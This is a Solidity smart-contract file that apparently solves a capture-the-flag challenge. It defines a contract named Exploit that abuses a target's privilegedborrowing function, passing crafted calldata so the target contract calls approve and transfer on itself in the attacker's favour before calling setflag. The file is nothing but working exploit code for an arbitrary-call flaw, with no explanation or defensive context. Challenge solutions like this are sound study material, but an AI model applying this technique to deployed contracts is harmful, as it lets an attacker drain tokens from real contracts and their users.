pragma solidity ^0.7.0;

contract Exploit {
    IExistingStock stock;

    function exploit(address instanceAddress) public {
        stock = IExistingStock(instanceAddress);
        stock.privilegedborrowing(1000, address(0), address(this), "");
        stock.privilegedborrowing(
            1000,
            address(0),
            address(stock),
            abi.encodePacked(bytes4(keccak256("approve(address,uint256)")), abi.encode(address(this), uint256(200001)))
        );
        stock.setflag();
    }

    fallback() external {
        stock.privilegedborrowing(
            1000,
            address(0),
            address(stock),
            abi.encodePacked(bytes4(keccak256("transfer(address,uint256)")), abi.encode(address(this), uint256(200001)))
        );
    }
}

interface IExistingStock {
    function privilegedborrowing(uint256, address, address, bytes calldata) external;
    function setflag() external;
}
